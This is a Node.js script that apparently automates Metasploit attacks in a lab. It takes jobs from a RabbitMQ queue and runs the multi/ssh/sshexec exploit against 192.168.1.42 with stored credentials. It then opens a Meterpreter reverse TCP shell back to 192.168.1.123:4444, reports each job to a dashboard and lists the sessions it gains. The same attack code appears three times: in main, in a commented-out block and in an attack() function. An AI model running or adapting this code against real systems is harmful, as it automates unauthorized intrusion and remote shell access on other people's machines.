#!/usr/bin/env node

var amqp = require('amqplib');
var nmap = require('node-nmap');
const axios = require('axios').default;
const axiosCookieJarSupport = require('axios-cookiejar-support').default;
const tough = require('tough-cookie');


require('dotenv').config();

axiosCookieJarSupport(axios);

const cookieJar = new tough.CookieJar();
axios.defaults.jar = cookieJar;
axios.defaults.withCredentials = true;

async function main() {
    try {
        const conn = await amqp.connect(process.env.RABBIT_STRING);
        console.log(conn);
        const channel = await conn.createChannel()
        await channel.assertQueue("msf-attack", {durable: false});
        await channel.prefetch(1);
    
        
        const MsfRpc = require('msfrpc');
        const msfrpcUri = process.env.MSFRPC_STRING;
        const msfrpc = new MsfRpc(msfrpcUri);
        console.log("about to connect");
        await msfrpc.connect();
        console.log("connected, getting version");
        let version = await msfrpc.core.version();
        console.log(version);
    
        console.log(process.env.EXPLOIT_OPTIONS);
    
        channel.consume("msf-attack", async function(msg) {
            msgJSON = JSON.parse(msg.content.toString());
            console.log(msgJSON);

            let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', {"RHOSTS": "192.168.1.42", "USERNAME": "bj", "PASSWORD": process.env.SSH_PASS, "PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "LHOST": "192.168.1.123", "LPORT": "4444"});
            console.log(job);
            
            axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
            .then(function(resp) {
                console.log(resp.status);
            })
            .catch(function(error) {
                console.log("in catch, trying to login'");
                let loginReq = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
                    "email": process.env.DASHBOARD_USER,
                    'password': process.env.DASHBOARD_PASS
                })
                loginReq
                .then(function(response) {
                    console.log(response.status);
                    console.log("login successful");
                })
                .catch(function(error) {
                    console.log("logi failed");
                    process.exit(1);
                });
        
                return loginReq
            })
            .then(function() {
                console.log("about to post job");
                axios.post(process.env.DASHBOARD_URL+'/exploit', {
                    ip: "192.168.1.42",
                    port: 22,
                    exploit: "multi/ssh/login",
                    jobID: job.uuid
                })
                .then(function(resp) {
                    console.log(resp.data);
        
                });
            })
        
            let running = true;
            while(running) {
                let jobList = await msfrpc.job.list();
                for (j in jobList) {
                    console.log(j);
                    running = false;
                    if(j === job.job_id) {
                        running = true;
                    }
                }
        
                let promise = new Promise((resolve, reject) => {
                    setTimeout(() => resolve("done!"), 1000)
                  });
                
                let result = await promise; // wait until the promise resolves (*)
            }
            console.log("job done!");
        
        
           let promise = new Promise((resolve, reject) => {
            setTimeout(() => resolve("done!"), 2000)
           });
        
            let result = await promise; // wait until the promise resolves (*)
        
            let sessionList = await msfrpc.session.list();
            console.log(sessionList);


            channel.ack(msg);
        });
    
    }
    catch(error) {
        console.error(error);
    }

    /*
    let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', {"RHOSTS": "192.168.1.42", "USERNAME": "bj", "PASSWORD": process.env.SSH_PASS, "PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "LHOST": "192.168.1.123", "LPORT": "4444"});
    console.log(job);
    
    axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
    .then(function(resp) {
        console.log(resp.status);
    })
    .catch(function(error) {
        console.log("in catch, trying to login'");
        let loginReq = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
            "email": process.env.DASHBOARD_USER,
            'password': process.env.DASHBOARD_PASS
        })
        loginReq
        .then(function(response) {
            console.log(response.status);
            console.log("login successful");
        })
        .catch(function(error) {
            console.log("logi failed");
            process.exit(1);
        });

        return loginReq
    })
    .then(function() {
        console.log("about to post job");
        axios.post(process.env.DASHBOARD_URL+'/exploit', {
            ip: "192.168.1.42",
            port: 22,
            exploit: "multi/ssh/login",
            jobID: job.uuid
        })
        .then(function(resp) {
            console.log(resp.data);

        });
    })

    let running = true;
    while(running) {
        let jobList = await msfrpc.job.list();
        for (j in jobList) {
            console.log(j);
            running = false;
            if(j === job.job_id) {
                running = true;
            }
        }

        let promise = new Promise((resolve, reject) => {
            setTimeout(() => resolve("done!"), 1000)
          });
        
        let result = await promise; // wait until the promise resolves (*)
    }
    console.log("job done!");


   let promise = new Promise((resolve, reject) => {
    setTimeout(() => resolve("done!"), 2000)
   });

    let result = await promise; // wait until the promise resolves (*)

    let sessionList = await msfrpc.session.list();
    console.log(sessionList);
   */


}

async function attack(options) {
    let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', {"RHOSTS": "192.168.1.42", "USERNAME": "bj", "PASSWORD": process.env.SSH_PASS, "PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "LHOST": "192.168.1.123", "LPORT": "4444"});
    console.log(job);
    
    axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
    .then(function(resp) {
        console.log(resp.status);
    })
    .catch(function(error) {
        console.log("in catch, trying to login'");
        let loginReq = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
            "email": process.env.DASHBOARD_USER,
            'password': process.env.DASHBOARD_PASS
        })
        loginReq
        .then(function(response) {
            console.log(response.status);
            console.log("login successful");
        })
        .catch(function(error) {
            console.log("logi failed");
            process.exit(1);
        });

        return loginReq
    })
    .then(function() {
        console.log("about to post job");
        axios.post(process.env.DASHBOARD_URL+'/exploit', {
            ip: "192.168.1.42",
            port: 22,
            exploit: "multi/ssh/login",
            jobID: job.uuid
        })
        .then(function(resp) {
            console.log(resp.data);

        });
    })

    let running = true;
    while(running) {
        let jobList = await msfrpc.job.list();
        for (j in jobList) {
            console.log(j);
            running = false;
            if(j === job.job_id) {
                running = true;
            }
        }

        let promise = new Promise((resolve, reject) => {
            setTimeout(() => resolve("done!"), 1000)
          });
        
        let result = await promise; // wait until the promise resolves (*)
    }
    console.log("job done!");


   let promise = new Promise((resolve, reject) => {
    setTimeout(() => resolve("done!"), 2000)
   });

    let result = await promise; // wait until the promise resolves (*)

    let sessionList = await msfrpc.session.list();
    console.log(sessionList);

}

function doWebAuth() {
    const request = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
        "email": process.env.DASHBOARD_USER,
        "password": process.env.DASHBOARD_PASS
    });

    request
    .then(function(response) {
        console.log(response.data);
        console.log(cookieJar);
        axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
        .then(function(resp) {
            console.log(resp.data);
            return resp.data;
        })
        .catch(function(err) {
            console.log(err);
        })
    })
    .catch(function(error) {
        console.log(error);
    })

    return request;
}
  
main();